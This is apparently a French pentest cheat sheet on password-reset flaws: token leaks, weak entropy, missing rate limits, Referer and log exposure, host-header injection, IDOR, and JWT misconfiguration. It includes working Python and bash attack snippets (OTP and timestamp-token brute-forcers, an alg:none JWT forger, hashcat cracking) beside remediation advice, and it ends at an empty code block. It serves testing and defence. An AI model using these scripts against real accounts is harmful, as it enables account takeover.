---
title: "Insecure Password Reset - Défauts de conception des flux de réinitialisation"
description: "Analyse approfondie des faiblesses dans les processus de réinitialisation de mot de passe : fuites de jetons, entropie, rate-limiting et remédiation."
tags:
  - web
  - authentication
  - password-reset
  - broken-authentication
  - owasp
  - token-entropy
  - rate-limiting
  - host-header-injection
  - referer-leakage
  - account-takeover
  - csrf
  - jwt
  - idor
  - log-exposure
  - monitoring
  - parameter-pollution
---

# Insecure Password Reset — fiche de triche terrain

!!! warning "Cadre légal"
    Ces techniques ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.

---

## 1. Résumé exécutif & contexte

Les **défauts de conception dans les flux de réinitialisation de mot de passe** (*Insecure Password Reset*) regroupent l'ensemble des failles permettant à un attaquant de détourner, deviner ou intercepter le mécanisme censé permettre à un utilisateur légitime de recouvrer l'accès à son compte. Contrairement à une simple faiblesse de mot de passe, ces défauts contournent entièrement le mécanisme d'authentification en s'attaquant à la **procédure de recouvrement elle-même**, souvent moins auditée que le formulaire de connexion principal.

- **OWASP Top 10 Web (2021)** : classé sous `A07:2021 — Identification and Authentication Failures`, catégorie qui couvre l'ensemble des défauts affectant la vérification d'identité, y compris les procédures de recouvrement de compte.
- Le flux de réinitialisation constitue une **cible à forte valeur** car il est conçu, par nature, pour accorder un accès complet au compte sans connaître le mot de passe existant — tout défaut à ce niveau contourne intégralement les protections mises en place sur le formulaire de login (MFA compris, si celui-ci n'est pas re-vérifié après reset).

!!! danger "Impact métier"
    | Impact | Exemple concret |
    |---|---|
    | Account Takeover (ATO) | Un attaquant réinitialise le mot de passe d'un compte cible sans jamais le connaître, prenant un contrôle total |
    | Élévation de privilèges | Prise de contrôle d'un compte administrateur via le même flux, faiblement protégé sur l'ensemble du parc utilisateurs |
    | Compromission massive | Un défaut d'entropie ou de rate-limiting permet l'automatisation de l'attaque sur l'ensemble de la base utilisateurs (credential stuffing indirect) |
    | Contournement de MFA | Si le flux de reset ne revérifie pas le second facteur, il devient un chemin de contournement direct de l'authentification forte |

**Défaut de logique d'authentification vs vulnérabilité d'implémentation technique :**

- Un **défaut de logique** touche la conception du flux lui-même : absence d'expiration, absence d'invalidation après usage, absence de revérification du second facteur, réutilisation du même jeton pour plusieurs actions.
- Une **vulnérabilité d'implémentation** touche la réalisation technique d'un flux par ailleurs bien conçu : fuite du jeton dans une réponse HTTP, PRNG non cryptographique, en-tête `Host` non validé.

Ces deux catégories se cumulent souvent dans un même flux vulnérable, et la méthodologie ci-dessous couvre les deux.

---

## 2. Mécanisme & fonctionnement interne

### Flux de réinitialisation sécurisé — fonctionnement théorique

```text
1. Utilisateur soumet son identifiant (email/username) via le formulaire "mot de passe oublié"
2. Serveur génère un jeton à haute entropie (CSPRNG), lié au compte et horodaté
3. Serveur stocke uniquement le HASH du jeton (jamais le jeton en clair) avec sa date d'expiration
4. Serveur envoie le jeton en clair EXCLUSIVEMENT via un canal hors-bande (email, SMS)
   — jamais dans la réponse HTTP de la requête de demande
5. Utilisateur clique sur le lien / saisit le code reçu
6. Serveur valide : jeton non expiré + hash correspondant + usage unique non déjà consommé
7. Utilisateur soumet un nouveau mot de passe
8. Serveur invalide immédiatement le jeton ET toutes les sessions actives du compte
```

Chaque étape de ce flux constitue un point de défaillance potentiel si elle n'est pas implémentée correctement. Les trois familles de faiblesses de conception les plus fréquentes sont détaillées ci-dessous.

### Faiblesse 1 : exposition de données sensibles dans la réponse HTTP

Certaines implémentations, généralement pour faciliter le débogage ou les tests automatisés en environnement de développement, laissent par erreur le jeton de réinitialisation (ou le lien complet le contenant) transiter dans :

- Le corps JSON de la réponse à la requête `POST /forgot-password`
- Un en-tête HTTP personnalisé de la réponse
- Un cookie posé côté client
- Une réponse d'API interne exposée par erreur côté front-end (SPA appelant directement un endpoint de génération de token)

!!! danger "Pourquoi c'est critique"
    Si le jeton est présent dans la réponse HTTP reçue par le **demandeur** de la réinitialisation, alors n'importe qui connaissant l'email/username d'une victime peut initier la demande à sa place et récupérer le jeton directement dans la réponse — sans jamais avoir accès à la boîte mail de la victime. Le canal "hors-bande" cesse d'exister.

### Faiblesse 2 : défaut d'entropie et prédictibilité du jeton

| Source de jeton faible | Problème |
|---|---|
| PRNG non cryptographique (`rand()`, `Math.random()`) | Générateurs conçus pour la performance statistique, pas pour l'imprédictibilité cryptographique ; leur état interne peut être reconstruit après observation d'une série de sorties |
| Horodatage Unix (timestamp) | Espace de valeurs plausibles réduit à quelques secondes/minutes autour du moment de la demande — brute-forçable en quelques requêtes |
| Identifiant séquentiel ou dérivé de l'ID utilisateur | Prévisible par simple incrémentation ou connaissance de l'ID cible |
| Hash non salé d'une donnée connue (ex : `md5(email)`) | Recalculable hors ligne instantanément dès lors que l'email de la victime est connu — aucune entropie réelle apportée par le hachage |

!!! warning "Le hachage n'apporte pas d'entropie en soi"
    Hacher une donnée déjà connue ou devinable (email, user_id, timestamp) ne crée **aucune** entropie supplémentaire : le hash reste entièrement recalculable par quiconque connaît (ou devine) l'entrée. Seule une source aléatoire cryptographique **avant** hachage éventuel apporte une réelle protection.

### Faiblesse 3 : absence de contrôle de débit (rate-limiting)

Un jeton ou OTP court (4 à 6 chiffres, soit 10 000 à 1 000 000 de combinaisons) devient trivialement brute-forçable dès lors qu'aucune limite n'encadre :

- Le nombre de tentatives de soumission du code par compte cible
- Le nombre de tentatives par adresse IP source
- La fenêtre temporelle de validité pendant laquelle les tentatives sont possibles

En parallèle, l'absence de limitation sur la **demande** de réinitialisation elle-même permet un **Mail Flooding** : génération automatisée de centaines de demandes de reset vers la boîte mail d'une victime, constituant un déni de service applicatif ciblé (nuisance, masquage d'alertes légitimes, voire saturation de quota SMTP).

---

## 3. Empreinte & détection

### Mapping du flux de réinitialisation

Avant tout test, cartographier exhaustivement chaque étape observable :

1. Endpoint de demande (`POST /forgot-password`, `POST /api/v1/password-reset/request`)
2. Canal de réception (email, SMS, notification push) et format exact du lien ou du code
3. Endpoint de validation/soumission du nouveau mot de passe (`POST /reset-password`, `PUT /api/v1/password-reset/confirm`)
4. Comportement post-reset : invalidation de session, notification à l'utilisateur, revérification MFA

### Analyse des requêtes et réponses HTTP

```http
POST /api/v1/forgot-password HTTP/1.1
Host: cible.com
Content-Type: application/json

{"email": "victime@mail.com"}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "Reset email sent",
  "debug_token": "a1b2c3d4e5f6..."
}
```

!!! danger "Signal de vulnérabilité immédiat"
    La simple présence d'un champ `token`, `debug_token`, `reset_link`, ou de tout identifiant exploitable dans la réponse `200 OK` à la demande de réinitialisation constitue en soi une confirmation de vulnérabilité, indépendamment de toute autre analyse.

Points d'inspection systématiques :

- Corps JSON complet de la réponse à `POST /forgot-password` (y compris champs visiblement destinés au debug)
- En-têtes de la réponse (`Set-Cookie`, en-têtes custom `X-Reset-*`)
- Onglet Réseau du navigateur lors du clic sur le lien reçu par email : requêtes vers des domaines tiers (CDN, polices, widgets sociaux) et présence du token dans leur en-tête `Referer`
- Réponses HTTP des ressources externes chargées par la page de réinitialisation

### Analyse des jetons (Token Analysis)

```bash
# Génération répétée de demandes de reset pour collecter un échantillon de jetons
for i in $(seq 1 20); do
  curl -s -X POST https://cible.com/api/v1/forgot-password \
    -H "Content-Type: application/json" \
    -d '{"email":"test_account@mail.com"}' \
    | jq -r '.debug_token // .token // empty'
  sleep 1
done > tokens_sample.txt
```

```python
# Évaluation basique de l'entropie apparente d'un échantillon de jetons
import math
from collections import Counter

def shannon_entropy(s: str) -> float:
    counts = Counter(s)
    length = len(s)
    return -sum((c / length) * math.log2(c / length) for c in counts.values())

with open("tokens_sample.txt") as f:
    tokens = [line.strip() for line in f if line.strip()]

for t in tokens:
    print(f"{t} -> longueur={len(t)}, entropie_shannon={shannon_entropy(t):.2f} bits/char")

# Un jeton cryptographiquement robuste en hexadécimal doit approcher 4 bits/caractère.
# Une entropie nettement inférieure, ou une corrélation visible avec l'horodatage de
# génération, signale un PRNG faible ou une dérivation prévisible.
```

Points à évaluer systématiquement sur l'échantillon collecté :

- **Longueur** du jeton (un jeton court, même aléatoire, reste brute-forçable)
- **Jeu de caractères** utilisé (hexadécimal, base62, numérique pur pour un OTP)
- **Corrélation temporelle** : les jetons générés à quelques secondes d'intervalle présentent-ils une similarité structurelle décelable ?
- **Répétabilité** : deux demandes de reset rapprochées pour le même compte génèrent-elles des jetons totalement indépendants, ou dérivés l'un de l'autre ?

---

## 4. Méthodologie d'exploitation & variantes

### Variante 1 : Divulgation directe du jeton dans la réponse HTTP

```http
POST /api/v1/forgot-password HTTP/1.1
Host: cible.com
Content-Type: application/json

{"email": "victime@mail.com"}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "message": "If this account exists, a reset link has been sent.",
  "reset_url": "https://cible.com/reset?token=9f8e7d6c5b4a3f2e1d0c"
}
```

L'attaquant, connaissant uniquement l'adresse email de la victime (souvent publique ou devinable), initie lui-même la demande et récupère `reset_url` directement dans la réponse qu'il reçoit — sans jamais accéder à la boîte mail de la victime :

```http
POST /api/v1/reset-password HTTP/1.1
Host: cible.com
Content-Type: application/json

{
  "token": "9f8e7d6c5b4a3f2e1d0c",
  "new_password": "AttackerControlled123!"
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "password updated"}
```

!!! danger "Prise de contrôle complète en deux requêtes"
    Ce scénario ne nécessite aucune interaction de la victime : la totalité de l'attaque se déroule côté attaquant, en observant simplement la réponse à sa propre requête.

### Variante 2 : Faible entropie et prédictibilité des jetons

**Cas A — Timestamp Unix comme source du jeton :**

```python
# Si le jeton est dérivé d'un timestamp connu à quelques secondes près
# (ex : moment d'envoi observable via l'en-tête "Date" de l'email reçu),
# l'espace de recherche devient trivial à parcourir.
import hashlib
import requests

BASE_TS = 1767200000  # timestamp approximatif du moment de la demande, +/- marge d'incertitude
WINDOW = 120           # marge de +/- 2 minutes autour du timestamp observé

for ts in range(BASE_TS - WINDOW, BASE_TS + WINDOW):
    candidate = hashlib.md5(str(ts).encode()).hexdigest()
    r = requests.post(
        "https://cible.com/api/v1/reset-password",
        json={"token": candidate, "new_password": "AttackerControlled123!"},
        timeout=5,
    )
    if r.status_code == 200:
        print(f"Jeton valide trouvé pour ts={ts} -> {candidate}")
        break
```

**Cas B — Hash non salé de l'email de la victime :**

```bash
echo -n "victime@mail.com" | md5sum
# Si l'application utilise md5(email) comme jeton de reset, le calcul est immédiat
# dès lors que l'email de la cible est connu — aucune connaissance de secret serveur requise.
```

**Cas C — PRNG non cryptographique observable statistiquement :**

Une collecte de plusieurs centaines de jetons générés successivement (cf. section 3, `tokens_sample.txt`) permet, pour certains PRNG faibles (Mersenne Twister non sécurisé, `java.util.Random`, `Math.random()` de Node.js), de reconstruire l'état interne du générateur et de prédire les sorties futures — technique hors du cadre de cette fiche mais dont la faisabilité doit être signalée dès qu'un tel générateur est identifié en source ou déduit du comportement observé.

### Variante 3 : Brute-force d'OTP / jetons courts par absence de rate-limiting

```python
# Brute-force d'un code OTP à 6 chiffres, en l'absence de toute limitation
# de tentatives par compte ou par IP source
import requests

TARGET_EMAIL = "victime@mail.com"
URL = "https://cible.com/api/v1/reset-password/confirm"

for code in range(0, 1_000_000):
    otp = f"{code:06d}"
    r = requests.post(URL, json={"email": TARGET_EMAIL, "otp": otp}, timeout=3)
    if r.status_code == 200:
        print(f"OTP valide trouvé : {otp}")
        break
    if code % 10000 == 0:
        print(f"Progression : {code}/1000000 testés")
```

!!! warning "Fenêtre d'exploitation réelle"
    Un espace de recherche de 1 000 000 de combinaisons reste tout à fait praticable en quelques minutes à quelques heures selon la latence réseau et le parallélisme utilisé, **dès lors qu'aucun verrou de compte, CAPTCHA ou blocage IP progressif n'intervient** et que la durée de validité du code dépasse ce délai (un code valide 15-30 minutes sans aucune limitation de tentative est directement exploitable).

### Variante 4 : Fuite du jeton via l'en-tête Referer (Referer Leakage)

Scénario : la page de réinitialisation (`https://cible.com/reset?token=SECRET_TOKEN`) charge des ressources tierces (widget de support client, police web externe, bouton de partage social). Le navigateur, par défaut, transmet l'URL complète — token inclus — dans l'en-tête `Referer` de ces requêtes sortantes.

```http
GET /widget.js HTTP/1.1
Host: support-widget-tiers.com
Referer: https://cible.com/reset?token=9f8e7d6c5b4a3f2e1d0c
```

Si `support-widget-tiers.com` journalise ses en-têtes de requête (cas fréquent pour des besoins d'analytics ou de debug), le jeton de réinitialisation de la victime se retrouve exposé dans les logs d'un tiers totalement extérieur au périmètre de sécurité de l'application cible.

!!! tip "Détection pratique"
    Ouvrir l'onglet Réseau du navigateur lors de l'accès au lien de réinitialisation et inspecter l'en-tête `Referer` de **chaque** requête sortante vers un domaine différent de celui de l'application. La présence du paramètre `token` dans l'URL référente (plutôt que dans le corps d'une requête `POST`) est le facteur aggravant central de cette variante.

### Variante 5 : Host Header Injection dans l'email de réinitialisation

Scénario : le backend construit dynamiquement le lien de réinitialisation envoyé par email en se basant sur l'en-tête `Host` (ou `X-Forwarded-Host`) de la requête entrante plutôt que sur un domaine de base fixé en configuration.

```http
POST /api/v1/forgot-password HTTP/1.1
Host: attaquant-controle.com
X-Forwarded-Host: attaquant-controle.com
Content-Type: application/json

{"email": "victime@mail.com"}
```

Si le backend génère le lien envoyé par email sous la forme `https://{Host}/reset?token=...`, la victime reçoit un e-mail légitime (envoyé par le serveur réel, donc passant les vérifications SPF/DKIM) contenant néanmoins un lien pointant vers `https://attaquant-controle.com/reset?token=SECRET_TOKEN` :

```text
Objet : Réinitialisation de votre mot de passe
De : noreply@cible.com

Cliquez sur ce lien pour réinitialiser votre mot de passe :
https://attaquant-controle.com/reset?token=9f8e7d6c5b4a3f2e1d0c
```

Lorsque la victime clique sur le lien, le jeton en clair est transmis directement au serveur de l'attaquant via la requête `GET` initiale, avant même toute tentative de validation légitime.

!!! danger "Pourquoi cette variante contourne les protections SPF/DKIM/DMARC"
    L'email provient bel et bien du serveur légitime de `cible.com` — seul le **contenu** du lien est empoisonné. Aucune protection anti-spoofing ne détecte cette attaque, puisque l'expéditeur réel n'est jamais usurpé ; seule l'URL contenue dans un email par ailleurs authentique redirige vers un domaine contrôlé par l'attaquant.

---

### Variante 6 : Exposition du jeton dans les journaux serveur et systèmes d'analyse tiers

Lorsque le jeton de réinitialisation est transmis en **paramètre GET dans l'URL** (schéma `/reset?token=SECRET`), il ne circule pas uniquement entre le client et le serveur applicatif — il est capturé et persisté dans de multiples systèmes tiers sans qu'aucune mesure de sécurité applicative puisse l'en empêcher.

**Surfaces d'exposition systématiques :**

| Surface | Mécanisme d'exposition |
|---|---|
| Logs d'accès serveur (Apache, Nginx) | La ligne de log comprend la requête `GET /reset?token=SECRET HTTP/1.1` intégralement |
| Logs CDN (Cloudflare, Akamai, Fastly) | L'URL complète est journalisée côté CDN avant même d'atteindre l'origine |
| Outils d'analyse web (Google Analytics, Matomo) | Le beacon analytics envoie l'URL courante — token inclus — vers le domaine tiers d'analytics |
| Historique et cache du navigateur | L'URL complète est stockée dans l'historique local et potentiellement dans les sauvegardes |
| Proxies d'entreprise et DLP | Tout proxy HTTP interceptant le trafic HTTPS journalise l'URL déchiffrée |
| Partage involontaire de l'URL | Un utilisateur copie-colle le lien de réinitialisation par erreur dans un ticket de support ou un chat |

```http
# Ce que le serveur Nginx journalise automatiquement dans access.log
# pour un simple clic sur le lien de reset envoyé par email :
GET /reset?token=9f8e7d6c5b4a3f2e1d0c HTTP/2.0 — 200
# → le jeton apparaît en clair dans tous les systèmes d'agrégation de logs
#   (ELK, Splunk, Datadog, CloudWatch Logs) qui ingèrent ce fichier.
```

```http
# Beacon Google Analytics généré automatiquement par gtag.js
# lors du chargement de la page de réinitialisation :
GET /collect?v=1&t=pageview&dl=https%3A%2F%2Fcible.com%2Freset%3Ftoken%3D9f8e7d6c5b4a3f2e1d0c HTTP/1.1
Host: www.google-analytics.com
# → le token transite vers les serveurs Google encodé en URL dans le paramètre dl (document location).
```

!!! danger "Persistance et transitivité de l'exposition"
    Contrairement aux autres variantes, l'exposition via les logs est **permanente** (les logs sont conservés des semaines à des mois) et **transitive** (un accès aux logs d'agrégation suffit — aucun accès à la boîte mail ni à la session réseau de la victime n'est requis). Un attaquant disposant d'un accès en lecture aux logs applicatifs ou CDN peut récupérer en masse les jetons de l'ensemble des utilisateurs ayant effectué une demande de reset sur la période de rétention des logs.

**Détection (Red Team) :**

```bash
# Vérifier si le token est passé en GET (visible dans les logs) ou en POST (non journalisé par défaut)
# Observer la forme du lien reçu dans l'email de reset :
# Vulnérable :  https://cible.com/reset?token=SECRET          (paramètre GET dans l'URL)
# Sécurisé :    https://cible.com/reset/SECRET                 (segment de chemin — toujours visible en log)
# Sécurisé+ :   https://cible.com/reset + soumission POST du token depuis un champ caché

# Inspecter si des scripts d'analytics tiers sont chargés sur la page /reset
curl -s https://cible.com/reset?token=TEST_TOKEN | grep -Ei "(google-analytics|gtag|matomo|hotjar|segment)"
```

**Remédiation spécifique :**

- Bannir l'usage du jeton comme paramètre GET — le transmettre dans le corps d'un formulaire `POST` ou, si l'URL reste inévitable, dans un fragment `#` (non transmis au serveur ni aux ressources tierces via Referer, mais persistant dans l'historique navigateur).
- Activer la directive `$request_uri` masking dans la configuration de log Nginx/Apache pour les chemins `/reset*`, ou filtrer les paramètres sensibles côté agrégateur de logs.
- Ne charger **aucun** script tiers (analytics, support, fonts externes) sur la page de réinitialisation — si inévitable, les charger après validation et consommation du token.

---

### Variante 7 : Jeton non invalidé après changement d'adresse email ou de compte

Cette variante exploite une **incohérence de cycle de vie** : un jeton de réinitialisation est émis et lié à un email, mais n'est pas révoqué si l'état du compte change entre l'émission et l'utilisation du jeton.

**Scénario A — Attaquant ex-propriétaire de l'adresse email :**

```text
1. L'utilisateur légitime utilise email@ancien-domaine.com pour son compte
2. Cet utilisateur initie une réinitialisation → token T généré, lié à email@ancien-domaine.com
3. L'utilisateur change son adresse email dans les paramètres du compte → désormais email@nouveau.com
4. Token T reste valide dans la base de données (non révoqué lors du changement d'email)
5. Un attaquant disposant d'un accès à email@ancien-domaine.com (domaine expiré, ex-employé, etc.)
   retrouve le lien de reset dans l'ancienne boîte et l'utilise pour prendre le contrôle du compte
   qui n'est plus associé à cet email
```

**Scénario B — Token émis pendant une fenêtre de transition de compte :**

```text
1. Un administrateur change l'adresse email d'un utilisateur dans le back-office
2. Si un token de reset existait déjà pour l'ancienne adresse → il reste exploitable
3. Tout tiers ayant eu accès à l'ancienne boîte mail (hébergeur, IT, ex-collègue)
   peut consommer le token après la transition
```

```http
# Vérification de la vulnérabilité :
# Étape 1 : demander un reset (le token T est généré et envoyé)
POST /api/v1/forgot-password HTTP/1.1
{"email": "test@mail.com"}

# Étape 2 : changer l'adresse email du compte (dans l'interface utilisateur)
PUT /api/v1/account/email HTTP/1.1
{"new_email": "test2@mail.com", "password": "current_password"}

# Étape 3 : tenter d'utiliser l'ancien token T (envoyé à test@mail.com)
POST /api/v1/reset-password HTTP/1.1
{"token": "TOKEN_T", "new_password": "Hacked123!"}

# Si HTTP 200 → le token n'a pas été révoqué lors du changement d'email → vulnérable
```

!!! warning "Surface d'attaque souvent oubliée lors des audits"
    Les revues de sécurité se concentrent généralement sur la génération et la validation du token, mais rarement sur les **événements du cycle de vie du compte** (changement d'email, changement de rôle, désactivation/réactivation, fusion de comptes) qui devraient déclencher une révocation de tous les tokens en cours.

**Remédiation :**

- Lier le token non seulement à l'`user_id` mais aussi à un **hachage de l'état courant du compte** (email actuel, statut, horodatage de dernière modification) — tout changement d'état invalide structurellement le token.
- Ou plus simplement : révocation explicite de **tous les tokens de reset en cours** pour un utilisateur dès qu'un événement de modification de compte est enregistré (changement d'email, modification de rôle, désactivation).

```python
# Python — révocation des tokens lors d'un changement d'email
def update_user_email(user_id: str, new_email: str) -> None:
    # Révocation préventive de tous les tokens de reset actifs avant le changement d'état
    db.session.execute(
        "UPDATE password_reset_tokens SET used = true WHERE user_id = :uid AND used = false",
        {"uid": user_id},
    )
    db.session.execute(
        "UPDATE users SET email = :email WHERE id = :uid",
        {"email": new_email, "uid": user_id},
    )
    db.session.commit()
```

---

### Variante 8 : Contournement de logique — IDOR et manipulation de paramètres

Certaines implémentations vulnérables permettent de contourner la validation du jeton par des manipulations de logique applicative directes, sans nécessiter de connaître un jeton valide.

**Cas A — IDOR : l'`user_id` dans le corps de la requête est utilisé sans validation du token**

```http
# Requête légitime attendue par l'application
POST /api/v1/reset-password HTTP/1.1
Content-Type: application/json

{
  "token": "TOKEN_VALIDE",
  "user_id": "12345",
  "new_password": "NewPassword123!"
}
```

```http
# Requête manipulée : token supprimé ou vide, user_id d'une victime substitué
# Si le backend valide uniquement la présence de user_id sans vérifier le token → ATO direct
POST /api/v1/reset-password HTTP/1.1
Content-Type: application/json

{
  "token": "",
  "user_id": "99999",
  "new_password": "Hacked123!"
}
```

**Cas B — HTTP Parameter Pollution : double paramètre exploitant les comportements d'analyse**

```http
# Certains frameworks prennent la première occurrence, d'autres la dernière.
# Si le token de validation porte sur le premier paramètre mais que le traitement
# utilise le second (ou vice-versa), une validation fantôme est possible.
POST /api/v1/reset-password HTTP/1.1
Content-Type: application/x-www-form-urlencoded

token=TOKEN_VALIDE_POUR_MON_COMPTE&user_id=MON_ID&token=INVALIDE&user_id=VICTIME_ID
```

**Cas C — Manipulation de valeur nulle / type juggling**

```http
# PHP est historiquement vulnérable au type juggling : "0" == false, null == false, etc.
# Si la validation du token est de la forme : if ($token == $stored_token) {...}
# et que $stored_token est null (compte sans token actif), alors token=0 peut valider.
POST /api/v1/reset-password HTTP/1.1
Content-Type: application/json

{
  "token": null,
  "email": "victime@mail.com",
  "new_password": "Hacked123!"
}
```

```php
<?php
// Exemple de code vulnérable au type juggling PHP
// Ne JAMAIS utiliser == pour comparer des tokens — utiliser === (comparaison stricte)
// et hash_equals() pour éviter les timing attacks
if ($submitted_token == $record['token_hash']) {  // VULNÉRABLE : == vs ===
    // ...
}

// Correction obligatoire
if (hash_equals($record['token_hash'], hash('sha256', $submitted_token))) {  // CORRECT
    // ...
}
?>
```

!!! tip "Méthodologie de test systématique — Checklist Red Team"
    - [ ] Supprimer le paramètre `token` de la requête : le serveur rejette-t-il la demande ?
    - [ ] Soumettre `"token": null`, `"token": ""`, `"token": "0"`, `"token": false` : chacune rejette-t-elle ?
    - [ ] Substituer un `user_id` ou `email` appartenant à une autre victime en conservant son propre token valide : le serveur utilise-t-il l'ID du token ou l'ID du corps de requête ?
    - [ ] Dupliquer le paramètre `token` avec deux valeurs différentes (HTTP Parameter Pollution) : laquelle est évaluée ?
    - [ ] Envoyer le token d'un compte de test pour réinitialiser le compte d'un autre utilisateur.

---

### Variante 9 : Jeton de réinitialisation JWT mal configuré

Certaines implémentations modernes représentent le jeton de réinitialisation sous forme de **JSON Web Token (JWT)** plutôt que d'un jeton opaque aléatoire. Cette approche introduit une surface d'attaque spécifique aux défauts de configuration JWT.

**Structure d'un JWT de reset type :**

```bash
# Décodage du JWT reçu dans le lien de reset (header.payload.signature)
# Le point "." sépare les trois parties encodées en Base64url
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ2aWN0aW1lQG1haWwuY29tIiwiZXhwIjoxNzY3MjAwMDAwLCJ0eXBlIjoicGFzc3dvcmRfcmVzZXQifQ.SIGNATURE" \
  | python3 -c "
import sys, base64, json
parts = sys.stdin.read().strip().split('.')
for i, p in enumerate(parts[:2]):
    padding = '=' * (4 - len(p) % 4)
    print(f'Partie {i}: {json.dumps(json.loads(base64.urlsafe_b64decode(p + padding)), indent=2)}')
"
# Résultat attendu :
# Partie 0 (header) : {"alg": "HS256"}
# Partie 1 (payload): {"sub": "victime@mail.com", "exp": 1767200000, "type": "password_reset"}
```

**Cas A — Algorithme `none` (bypass de signature)**

```python
import base64, json

# Forger un JWT sans signature en changeant l'algorithme en "none"
# Certaines bibliothèques JWT vulnérables acceptent un token non signé si alg=none
def forge_jwt_none(email: str, exp: int = 9999999999) -> str:
    header  = base64.urlsafe_b64encode(json.dumps({"alg": "none"}).encode()).rstrip(b'=').decode()
    payload = base64.urlsafe_b64encode(
        json.dumps({"sub": email, "exp": exp, "type": "password_reset"}).encode()
    ).rstrip(b'=').decode()
    # Signature vide — acceptée par les bibliothèques non patchées
    return f"{header}.{payload}."

print(forge_jwt_none("admin@cible.com"))
```

**Cas B — Secret HS256 faible (brute-force hors ligne)**

```bash
# Si l'algorithme est HS256 avec un secret court ou basé sur un mot du dictionnaire,
# hashcat peut retrouver le secret en quelques secondes à quelques minutes hors ligne.
# Le JWT complet (header.payload.signature) est nécessaire comme entrée.
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0QG1haWwuY29tIiwiZXhwIjo5OTk5OTk5OTk5fQ.SIGNATURE" > jwt.txt

# Mode 16500 = JWT/JWS (HS256/384/512)
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Si le secret est trouvé, l'attaquant peut signer n'importe quel payload valide :
python3 -c "
import jwt  # pip install PyJWT
secret = 'motdepasse123'  # secret retrouvé
payload = {'sub': 'admin@cible.com', 'exp': 9999999999, 'type': 'password_reset'}
print(jwt.encode(payload, secret, algorithm='HS256'))
"
```

**Cas C — Confusion RS256 → HS256 (algorithm confusion)**

```text
Scénario : l'application utilise RS256 (clé asymétrique) et expose sa clé publique
           (souvent via /.well-known/jwks.json ou /api/auth/public-key).

Attaque   : forger un token en signant avec la clé PUBLIQUE comme secret HS256.
            Si la bibliothèque JWT côté serveur ne valide pas l'algorithme attendu,
            elle vérifiera la signature HS256 avec sa propre clé publique (connue
            de l'attaquant) et l'acceptera comme valide.
```

```bash
# Récupération de la clé publique RSA exposée par l'application
curl https://cible.com/.well-known/jwks.json | jq '.keys[0]'

# Conversion JWKS → PEM pour usage comme secret HS256
python3 -c "
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.backends import default_backend
import jwt, json, base64

# [Convertir la clé publique JWKS en PEM puis l'utiliser comme secret HS256]
# Voir : https://portswigger.net/web-security/jwt/algorithm-confusion
"
```

!!! danger "Pourquoi les JWT opaques sont préférables pour les tokens de reset"
    Un JWT expose sa structure et ses métadonnées (algorithme, type, expiration) à quiconque le décode — même sans connaître le secret. Un jeton opaque aléatoire (CSPRNG, 256 bits, stocké haché côté serveur) ne révèle aucune information exploitable et empêche toute attaque de type algorithm confusion ou forgery structurelle. **Réserver les JWT aux contextes où leur auto-contenance est réellement utile (ex : tokens inter-services stateless) ; ne pas en faire des tokens de reset.**

**Détection spécifique JWT (Red Team) :**

```bash
# 1. Identifier si le token de reset est un JWT (trois segments séparés par ".")
echo "TOKEN_RECU" | tr '.' '\n' | wc -l  # doit retourner 3

# 2. Inspecter l'en-tête pour identifier l'algorithme déclaré
echo "HEADER_B64" | base64 -d 2>/dev/null | python3 -m json.tool

# 3. Tenter le bypass alg:none (modifier l'header, vider la signature)
# 4. Si HS256 : tenter un brute-force avec hashcat (mode 16500)
# 5. Si RS256 : chercher la clé publique exposée et tenter la confusion d'algorithme
# 6. Vérifier si le claim "type" est validé côté serveur
#    (un JWT d'authentification peut-il être réutilisé comme token de reset ?)
```

---

## 5. Remédiation & hardening (perspective Blue Team)

### Conception robuste du jeton

- **Génération** : utiliser exclusivement un CSPRNG (`secrets` en Python, `crypto.randomBytes` en Node.js, `random_bytes()` en PHP) — jamais `rand()`, `Math.random()`, ou toute dérivation d'un timestamp, d'un ID utilisateur ou d'un hash non salé de donnée connue.
- **Longueur** : au minimum 128 bits d'entropie effective, soit 32 caractères hexadécimaux générés aléatoirement (ou équivalent en base62/base64 URL-safe).
- **Stockage** : ne jamais conserver le jeton en clair côté serveur — stocker uniquement son hash (SHA-256 minimum) en base de données, à l'image d'un mot de passe. La comparaison lors de la validation se fait sur le hash recalculé du jeton soumis par l'utilisateur.

### Gestion du cycle de vie du jeton

- **Durée de validité courte** : 10 à 15 minutes maximum, jamais illimitée.
- **Usage unique** : invalidation immédiate et irréversible du jeton dès sa première utilisation, réussie ou échouée après un nombre limité de tentatives.
- **Invalidation des sessions actives** : tout changement de mot de passe réussi doit invalider l'ensemble des sessions actives existantes sur le compte (hors, éventuellement, la session ayant initié le changement), forçant une réauthentification complète partout ailleurs.
- **Revérification MFA** : si le compte dispose d'une authentification à facteurs multiples, le flux de reset ne doit jamais permettre de la contourner silencieusement.

### Contrôle de débit et protections réseau

- **Rate-limiting strict**, appliqué à la fois par adresse IP source **et** par identifiant de compte cible, sur les deux endpoints (demande et soumission), avec verrouillage progressif (backoff exponentiel) plutôt qu'un simple seuil fixe.
- **CAPTCHA ou mécanisme anti-automatisation** sur la demande de réinitialisation, pour limiter le Mail Flooding, et sur la soumission du code, pour limiter le brute-force.
- Limitation explicite du nombre de demandes de reset autorisées par compte sur une fenêtre glissante (ex : 5 demandes/heure), indépendamment du rate-limiting par IP, pour contrer un attaquant distribué sur plusieurs adresses sources.

### Protection contre la fuite d'informations

- **Ne jamais renvoyer le jeton** (ni le lien complet le contenant) dans le corps, les en-têtes ou les cookies de la réponse HTTP à la demande de réinitialisation — celle-ci doit se limiter à un message générique de confirmation, identique que le compte existe ou non (protection accessoire contre l'énumération de comptes).
- Appliquer `Referrer-Policy: no-referrer` (ou à défaut `same-origin`) sur la page de réinitialisation, afin qu'aucune ressource tierce chargée sur cette page ne reçoive le token via l'en-tête `Referer`.
- **Fixer explicitement le domaine de base** utilisé pour construire les liens envoyés par email dans la configuration backend (variable d'environnement ou constante applicative), sans jamais dériver ce domaine depuis les en-têtes `Host` ou `X-Forwarded-Host` de la requête entrante.

```http
Referrer-Policy: no-referrer
```

### Exemple de code correctif — génération, stockage haché et validation sécurisée

```python
